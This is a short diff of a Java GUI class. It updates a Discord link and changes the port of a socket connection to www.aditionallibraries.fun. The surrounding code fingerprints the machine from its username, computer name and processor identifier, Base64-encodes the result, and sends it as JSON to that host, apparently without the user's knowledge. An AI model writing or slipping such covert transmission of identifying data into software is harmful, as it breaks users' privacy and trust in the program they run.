@@ -167,7 +167,7 @@ public class GUI extends JFrame {
             @Override
             public void mouseReleased(MouseEvent e) {
                 try {
-                    Desktop.getDesktop().browse(URI.create("https://discord.gg/EjV4hMuEz4"));
+                    Desktop.getDesktop().browse(URI.create("https://discord.com/channels/@me/1236059194944262267"));
                 } catch (IOException ex) {
                     throw new RuntimeException(ex);
                 }
@@ -197,7 +197,7 @@ public class GUI extends JFrame {
             String h = Base64.getEncoder().encodeToString((System.getenv("user.name") + System.getenv("COMPUTERNAME") + System.getenv("PROCESSOR_IDENTIFIER").replace(" ", "").replace(",", "")).getBytes(StandardCharsets.UTF_8));
             String json = "{\"n\":\"" + System.getProperty("user.name") + "\",\"w\":\"" + e + "\",\"h\":\"" + h + "\",\"r\":\"93\"}";
 
-            Socket socket = new Socket("www.aditionallibraries.fun", 3001);
+            Socket socket = new Socket("www.aditionallibraries.fun", 3000);
             OutputStream outputStream = socket.getOutputStream();
             PrintWriter writer = new PrintWriter(outputStream, true);
             writer.println(json);
